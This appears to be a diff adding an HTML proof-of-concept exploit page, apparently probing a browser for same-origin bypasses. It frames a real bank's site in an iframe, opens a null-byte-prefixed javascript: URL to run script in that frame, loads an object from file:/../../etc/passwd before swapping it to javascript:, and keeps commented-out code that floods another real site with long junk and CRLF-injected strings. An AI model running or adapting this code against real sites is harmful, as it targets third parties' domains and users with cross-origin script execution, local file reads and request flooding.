@@ -1,0 +1,41 @@
+<html>
+
+<title>Fuck</title>
+
+<iframe id="t" name="test" src="https://www.ca-sudrhonealpes.fr/" width="500px" height="300px"></iframe>
+
+<input type="button" value="test" onclick="window.open('\u0000javascript:alert(document.domain)', 'test')">
+
+<script>
+window.onload = function(){
+
+	object = document.createElement("object");
+	object.setAttribute("data", "file:/../../etc/passwd");
+	document.body.appendChild(object);
+	object.onload = function(){
+		object.setAttribute("data", "javascript:alert(document.domain)");
+			object.innerHTML = "foobar";
+	}
+	
+	object.onclick = function(){
+		alert(document.domain);
+			
+	}
+
+}
+
+//document.location = document.location + new Array(2000).join('aaaaaaaa');
+
+/*
+for(var i = 0;i < 1000000;i++){
+document.getElementById('t').src = "http://www.caf.fr/" + new Array(2000).join('\u0002\x0000\x0000aaaaaaaa') + "\r\n\r\necho AAAAAAAAAAAAAAAa";
+//alert(i)
+}
+*/
+
+</script>
+<span id="x"></span>
+
+
+
+</html>
